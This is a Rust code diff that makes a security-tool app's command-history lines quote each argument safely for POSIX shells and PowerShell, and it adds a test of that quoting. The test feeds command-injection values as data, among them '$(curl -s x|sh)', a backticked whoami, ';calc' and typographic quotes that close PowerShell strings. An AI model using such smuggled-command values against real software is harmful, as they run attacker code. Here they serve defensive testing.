@@ -298,6 +298,11 @@ fn ensure_native_executable(program: &std::path::Path) -> AppResult<()> {
     Ok(())
 }
 
+/// A run as command history records it, ready to paste into a shell (see `util::shell_word`).
+fn history_line(tool_id: &str, args: &[String]) -> String {
+    std::iter::once(crate::util::shell_word(tool_id)).chain(args.iter().map(|a| crate::util::shell_word(a))).collect::<Vec<_>>().join(" ")
+}
+
 /// All arguments together, in characters: the native confirmation shows them all.
 const MAX_ARGS_TEXT: usize = 16_384;
 
@@ -546,10 +551,9 @@ pub async fn start_execution(app: &AppHandle, db: &Db, request: ExecRequest, on_
         let _ = std::fs::remove_dir_all(&run_dir);
         return Err(AppError::Scope("Targets changed between confirmation and start; review and try again".into()));
     }
-    let rendered = std::iter::once(request.tool_id.clone())
-        .chain(validated.info.args.iter().map(|a| if a.contains(' ') { format!("\"{a}\"") } else { a.clone() }))
-        .collect::<Vec<_>>()
-        .join(" ");
+    // the history line is copied into terminals: every argument is quoted for POSIX shells and
+    // PowerShell alike, so pasting it runs this command and nothing else (Mission 7)
+    let rendered = history_line(&request.tool_id, &validated.info.args);
     db.with(|c| {
         c.execute(
             "INSERT INTO command_history (command, source, tool_id, project_id, created_at) VALUES (?1,'execution',?2,?3,?4)",
@@ -809,6 +813,97 @@ mod redirect_tests {
 #[cfg(test)]
 mod history_tests {
     use super::*;
+
+    /// The words a POSIX shell reads in `line` (quotes and backslashes; no expansions, which the
+    /// quoted forms never leave to the shell), or None when a quote is not closed.
+    fn posix_words(line: &str) -> Option<Vec<String>> {
+        let (mut words, mut cur, mut any) = (Vec::new(), String::new(), false);
+        let mut it = line.chars();
+        while let Some(c) = it.next() {
+            match c {
+                ' ' | '\t' => {
+                    if any {
+                        words.push(std::mem::take(&mut cur));
+                        any = false;
+                    }
+                }
+                '\'' => {
+                    any = true;
+                    loop {
+                        match it.next()? {
+                            '\'' => break,
+                            q => cur.push(q),
+                        }
+                    }
+                }
+                '"' => {
+                    any = true;
+                    loop {
+                        match it.next()? {
+                            '"' => break,
+                            '\\' => cur.push(it.next()?),
+                            q => cur.push(q),
+                        }
+                    }
+                }
+                '\\' => {
+                    any = true;
+                    cur.push(it.next()?);
+                }
+                _ => {
+                    any = true;
+                    cur.push(c);
+                }
+            }
+        }
+        if any {
+            words.push(cur);
+        }
+        Some(words)
+    }
+
+    /// Mission 7: a run's history line pastes back into a shell as the same words, and nothing in
+    /// an argument can end a quote or start another command, in POSIX shells or PowerShell.
+    #[test]
+    fn history_lines_paste_back_as_the_same_words() {
+        let cases: Vec<Vec<&str>> = vec![
+            vec!["-u", "https://app.example.com/a;calc"],
+            vec!["-H", "X: $(curl -s x|sh)", "--data", "`whoami`"],
+            vec!["x\u{2019};calc;\u{2019}", "it's", "\u{2018}\u{201A}\u{201B}"],
+            vec!["-p", "80,443", "@splat", "--%", "~root", "a*b?[c]", "#c", "{x}", "a&b|c", "<in", ">out"],
+            vec!["", "two words", "C:\\Program Files\\x.txt", "naïve", "例え"],
+        ];
+        for args in cases {
+            let args: Vec<String> = args.into_iter().map(String::from).collect();
+            let line = history_line("nmap", &args);
+            let words = posix_words(&line).unwrap_or_else(|| panic!("unclosed quote: {line}"));
+            assert_eq!(words[0], "nmap");
+            assert_eq!(&words[1..], &args[..], "{line}");
+            // PowerShell: outside single-quoted text, only plain words, spaces and the `"q"` joins
+            let mut quoted = false;
+            let mut rest = line.as_str();
+            while let Some(c) = rest.chars().next() {
+                rest = &rest[c.len_utf8()..];
+                if quoted {
+                    if matches!(c, '\'' | '\u{2018}' | '\u{2019}' | '\u{201A}' | '\u{201B}') {
+                        assert_eq!(c, '\'', "a typographic quote ends PowerShell's quoted text: {line}");
+                        quoted = false;
+                    }
+                } else if c == '\'' {
+                    quoted = true;
+                } else if c == '"' {
+                    let q = rest.chars().next().unwrap();
+                    assert!(matches!(q, '\'' | '\u{2018}' | '\u{2019}' | '\u{201A}' | '\u{201B}') && rest[q.len_utf8()..].starts_with('"'), "{line}");
+                    rest = &rest[q.len_utf8() + 1..];
+                } else {
+                    assert!(c == ' ' || c.is_ascii_alphanumeric() || "_+=:./-".contains(c), "{c:?} outside quotes: {line}");
+                }
+            }
+            assert!(!quoted, "{line}");
+        }
+        assert_eq!(history_line("nmap", &["-sV".into(), "10.0.0.1".into()]), "nmap -sV 10.0.0.1");
+        assert_eq!(crate::util::shell_word("x\u{2019};calc"), "'x'\"\u{2019}\"';calc'");
+    }
 
     /// Mission 7: arguments that could disguise the command in the native confirmation are
     /// refused, and the confirmation shows where every argument starts and ends.
